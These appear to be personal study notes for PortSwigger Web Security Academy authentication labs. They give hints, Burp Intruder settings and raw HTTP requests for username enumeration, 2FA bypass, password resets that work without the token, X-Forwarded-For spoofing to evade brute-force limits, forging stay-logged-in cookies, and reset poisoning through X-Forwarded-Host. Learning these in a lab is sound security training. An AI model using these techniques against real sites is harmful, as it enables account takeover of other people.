# Authentications

## Description
Authentication is the process of verifying the identity of a given user or client. In other words, it involves making sure that they really are who they claim to be. At least in part, websites are exposed to anyone who is connected to the internet by design. Therefore, robust authentication mechanisms are an integral aspect of effective web security.

There are three authentication factors into which different types of authentication can be categorized:

Something you know, such as a password or the answer to a security question. These are sometimes referred to as "knowledge factors".
Something you have, that is, a physical object like a mobile phone or security token. These are sometimes referred to as "possession factors".
Something you are or do, for example, your biometrics or patterns of behavior. These are sometimes referred to as "inherence factors".
Authentication mechanisms rely on a range of technologies to verify one or more of these factors.

### Username enumeration via different responses

Run the request with the list given by PortSwigger
wait for a 302 code response

### 2FA simple bypass

When prompted for the verification code, manually change the URL to navigate to /my-account. The lab is solved when the page loads.

### Password reset broken logic

Tipically, try to enumerate the username at first, and after go for the password if there isn't any restrictions on the tentative

In a normal way you can use the sniper mode in burp intruder, in other scenario you can use cluster bomb and do all in one brute action

### Password reset broken logic

If you analize the forgot-password?temp-forgot-password-token request, try to erase from the url the token
Eventually, you'll find that the password could be reset, without providing it in the url

Original Request:

```
POST /forgot-password?temp-forgot-password-token=ESs0P04hVpQgRymERnJZEZiFdedXm7nX HTTP/1.1
Host: 0a5d00f9045e481cc0fe0301009100ef.web-security-academy.net
Cookie: session=KU7uYbWI4dbk1RmD5boztTHj0yEL7CDN
Content-Length: 115

temp-forgot-password-token=ESs0P04hVpQgRymERnJZEZiFdedXm7nX&username=wiener&new-password-1=test&new-password-2=test
```

Modified one, you need to generate a new request for the new token:

```
POST /forgot-password?temp-forgot-password-token HTTP/1.1
Host: 0a5d00f9045e481cc0fe0301009100ef.web-security-academy.net
Cookie: session=KU7uYbWI4dbk1RmD5boztTHj0yEL7CDN

temp-forgot-password-token=cv3s8gP2UgLIT5b1XbQZnzt5YSanSNmU&username=carlos&new-password-1=testo&new-password-2=testo
```

### Username enumeration via response timing

https://portswigger.net/web-security/authentication/password-based/lab-username-enumeration-via-subtly-different-responses

### Username enumeration via response timing

X-Forwarded-For header is supported, which allows you to spoof your IP address and bypass the IP-based brute-force protection.

Intruder - Pitchfork
"Pitchfork will iterate all the payloads list silmutaneously"
https://portswigger.net/web-security/authentication/password-based/lab-username-enumeration-via-response-timing

### Broken brute-force protection, IP block
username
carlos/rightPassword 
franco/tentativePassword
carlos/rightPassword

This to avoid the block of your IP after three times tries
https://portswigger.net/web-security/authentication/password-based/lab-broken-bruteforce-protection-ip-block

### Username enumeration via account lock

https://portswigger.net/web-security/authentication/password-based/lab-username-enumeration-via-account-lock

### 2FA broken logic

https://portswigger.net/web-security/authentication/multi-factor/lab-2fa-broken-logic

### Brute-forcing a stay-logged-in-cookie

base64(username+':'+md5HashOfPassword) -> wiener:51dc30ddc473d43a6011e9ebba6ca770

ON BURP INTRUDER

Payload Processing: 
Hash: MD5
Add prefix: wiener:
Encode: Base64-encode

https://portswigger.net/web-security/authentication/other-mechanisms/lab-brute-forcing-a-stay-logged-in-cookie

### Offline password cracking

https://portswigger.net/web-security/authentication/other-mechanisms/lab-brute-forcing-a-stay-logged-in-cookie

### Password reser poisoning via middleware

https://portswigger.net/web-security/authentication/other-mechanisms/lab-password-reset-poisoning-via-middleware
X-Forwarded-Host: your-exploit-server-id.web-security-academy.net to redirect the reset  link to server.
Here you can find the token in the log

### Password brute-force via password change

Be aware of the error message, in this case you can understand the current password of an user:

username=carlos&current-password=§incorrect-password§&new-password-1=123&new-password-2=abc
First error: Current password is incorrect
Nice error: New passwords do not match


Sometimes you can, instead, try to attempt a login 5 times with every username, in order to get a different error message. This will allow you, possibly, to enumerate the right username.
Sometimes grep the error message to have a better understanding

In other scenario, you can face the Base64-encoded cookie for the option stay-logged-in

wiener:51dc30ddc473d43a6011e9ebba6ca770

This could be the common structure:
base64(username+':'+md5HashOfPassword)

you can use payload processing option and set the order to process your payload

1: Hash: MD5
2: Add Prefix: carlos:
3: Encode -> Base64-encode
